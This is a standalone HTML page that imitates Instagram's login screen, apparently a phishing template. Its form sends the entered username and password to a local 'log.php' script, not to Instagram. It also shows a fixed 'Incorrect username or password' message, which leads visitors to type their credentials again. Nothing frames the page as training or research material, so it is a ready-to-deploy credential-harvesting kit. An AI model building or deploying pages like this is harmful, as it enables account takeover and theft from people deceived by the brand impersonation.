<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border: 1px solid #ddd;
      padding: 40px;
      width: 340px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box h1 {
      font-family: 'Arial Black', sans-serif;
      font-size: 2em;
      margin-bottom: 20px;
      color: #262626;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-box button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .login-box button:hover {
      background-color: #2a76c9;
    }
    .error-msg {
      color: red;
      font-size: 0.9em;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Instagram</h1>
    <form action="log.php" method="POST">
      <input type="text" name="username" placeholder="Phone number, username or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="error-msg">Incorrect username or password.</div>
  </div>
</body>
</html>